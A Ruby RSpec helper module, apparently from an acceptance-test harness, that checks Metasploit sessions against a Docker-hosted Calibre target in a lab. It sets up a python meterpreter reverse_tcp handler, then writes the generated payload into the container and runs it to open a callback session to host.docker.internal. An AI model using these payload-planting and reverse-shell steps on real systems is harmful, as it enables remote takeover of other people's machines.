# frozen_string_literal: true

require_relative '../laravel/sessions'
require_relative '../calibre/acceptance'

# Calibre keeps its genuine interpreter and formatter; lifecycle APIs are shared.
module CalibreSessions
  include LaravelSessions
  include CalibreTarget

  FAMILIES = { 'python-meterpreter' => [1, 'cmd/unix/python/meterpreter/reverse_tcp', 'meterpreter'] }.freeze

  def session_families
    FAMILIES
  end

  def session_exec_options
    ['--user', 'app']
  end

  def session_default_options
    {}
  end

  def session_control_name
    'CalibreSessionControl'
  end

  def session_health_path
    '/'
  end

  def process_state
    output, = rc_command('process-state', 'target', 'python3', '/opt/module-target-process-state.py')
    state = JSON.parse(output)
    state.fetch('processes').reject! do |row|
      row.fetch('command') == session_health_command || row.values_at('uid', 'ppid', 'command') == ['0', 0, 'runc init']
    end
    state
  end

  def callback_control
    server = TCPServer.new('0.0.0.0', LaravelSessions::CALLBACK_PORT)
    token = 'calibre-' + Rex::Text.rand_text_alphanumeric(24)
    program = <<~PYTHON
      import json, os, socket, sys
      host = socket.gethostbyname('host.docker.internal')
      identity = dict(host=host, token=sys.argv[1], uid=os.geteuid(), pid=os.getpid(), ppid=os.getppid(), python=list(sys.version_info[:3]))
      with socket.create_connection((host, int(sys.argv[2])), timeout=8) as peer:
          peer.sendall((json.dumps(identity) + '\\n').encode())
          with peer.makefile('rb') as stream:
              answer = stream.readline()
          assert answer == ('ACK:' + sys.argv[1] + '\\n').encode()
      print(json.dumps(identity))
    PYTHON
    task = Thread.new { Open3.capture3(*session_exec_argv('python3', '-c', program, token, LaravelSessions::CALLBACK_PORT.to_s)) }
    task.report_on_exception = false
    raise Timeout::Error, 'No native Calibre callback' unless IO.select([server], nil, nil, 8)

    peer = server.accept
    identity = JSON.parse(Timeout.timeout(5) { peer.gets })
    expect(identity).to include('token' => token, 'uid' => laravel_uid)
    state = process_state
    expect(state.fetch('processes')).to include(include('pid' => identity.fetch('pid'), 'ppid' => identity.fetch('ppid'), 'uid' => laravel_uid.to_s))
    expect(state.fetch('connections')).to include(include('state' => '01'))
    @rc[:callback] = { identity: identity, observed: state }
    peer.puts('ACK:' + token)
    peer.close
    output, error, status = Timeout.timeout(15) { task.value }
    @rc[:callback].merge!(stdout: output, stderr: error, exit: status.exitstatus)
    expect(status.success?).to be(true), output + error
    expect(JSON.parse(output)).to eq(identity)
    @listener_host = identity.fetch('host')
    settled
  ensure
    peer&.close unless peer&.closed?
    server&.close
    task&.join(15)
    rc_save
  end

  def native_session(family)
    if family == 'fetch'
      super
    else
      native_python_session(family)
    end
  end

  def native_python_session(family)
    _target, payload, = session_families.fetch(family)
    attempt = { family: family, owner: 'exploit/multi/handler', payload: payload }
    @rc[:attempts] << attempt
    source = "/tmp/module-target-calibre-native-#{Process.pid}-#{family}"
    log_path = source + '-output'
    expect(file(source)).to include('exists' => false)
    console_command('back')
    console_command('use exploit/multi/handler')
    { 'PAYLOAD' => payload, 'LHOST' => @listener_host, 'LPORT' => LaravelSessions::CALLBACK_PORT, 'ReverseListenerBindAddress' => '0.0.0.0', 'ExitOnSession' => false, 'ListenerTimeout' => 60, 'SessionCommunicationTimeout' => 10, 'SessionExpirationTimeout' => 90 }.each do |key, value|
      expect(console_command("set #{key} #{value}")).not_to include('Unknown datastore option')
    end
    attempt[:handler_output] = console_command('run -j -z')
    expect(attempt.fetch(:handler_output)).not_to include('Exploit failed', 'Exploit aborted')
    generated = rc_json("begin;job=framework.jobs.values.find{|entry|entry.ctx.first.fullname=='exploit/multi/handler'};raise 'No handler' unless job;handler,instance=job.ctx;{payload:instance.refname,fork:instance.datastore['MeterpreterTryToFork'],encoded:Base64.strict_encode64(handler.payload.encoded)};end")
    expect(generated.values_at('payload', 'fork')).to eq([payload, true])
    attempt[:generated] = generated
    code = Base64.strict_decode64(generated.fetch('encoded'))
    output, error, status = Open3.capture3(*session_exec_argv('sh', '-c', 'cat > "$1"; chmod 600 "$1"; sha256sum "$1"', 'native-script', source), stdin_data: code)
    attempt[:install] = { stdout: output, stderr: error, exit: status.exitstatus }
    expect(status.success?).to be(true), error
    expect(output.split.first).to eq(Digest::SHA256.hexdigest(code))
    output, error, status = Open3.capture3(*session_exec_argv('sh', '-c', 'output=$1; shift; exec "$@" > "$output" 2>&1', 'native-launch', log_path, 'sh', source, detached: true))
    attempt[:launch] = { stdout: output, stderr: error, exit: status.exitstatus }
    expect(status.success?).to be(true), error
    use_session(family, attempt, 'exploit/multi/handler')
    passed = true
  ensure
    primary = $ERROR_INFO
    attempt[:failure] = { type: primary.class.name, message: primary.message } if primary
    begin
      attempt[:final_process_state] = process_state
      attempt[:process_output] = file(log_path) if log_path
      rc_command('remove-native-script', 'target', 'rm', '-f', '--', source, log_path) if source
      cleanup_session
      @rc[:calibrated] << family if passed
    rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
      attempt[:cleanup_error] = { type: e.class.name, message: e.message }
      raise unless primary
    ensure
      rc_save
    end
  end

  def use_session(family, attempt, owner)
    result = super
    return result unless owner == laravel_owner

    events = rc_json('framework.instance_variable_get(:@calibre_events)')
    current = events.drop(@rc.fetch(:event_cursor, 0))
    @rc[:event_cursor] = events.length
    attempt[:events] = current
    expect(current.select { |event| event['event'] == 'call' && event['method'] == 'exec_calibre' }.length).to eq(1)
    result
  ensure
    rc_save
  end
end
